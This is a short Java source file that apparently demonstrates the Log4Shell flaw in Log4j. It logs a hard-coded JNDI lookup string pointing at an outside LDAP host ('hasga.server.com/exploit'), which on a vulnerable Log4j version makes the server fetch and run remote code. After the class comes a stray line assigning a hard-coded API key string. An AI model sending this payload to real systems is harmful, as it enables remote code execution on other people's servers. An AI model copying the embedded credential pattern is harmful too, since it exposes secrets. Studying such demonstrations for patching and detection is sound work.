import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class Log4ShellExample {

    private static final Logger logger = LogManager.getLogger(Log4ShellExample.class);

    public static void main(String[] args) {
        
        String userInput = "${jndi:ldap://hasga.server.com/exploit}";

        
        logUserInput(userInput);
        
        System.out.println("Log4Shell vulnerable example executed.");
    }

    private static void logUserInput(String input) {
    
        logger.error("User input logged: " + input);
    }
}

api_key='hahaje2123xzxc21321312wqf3asdnop'
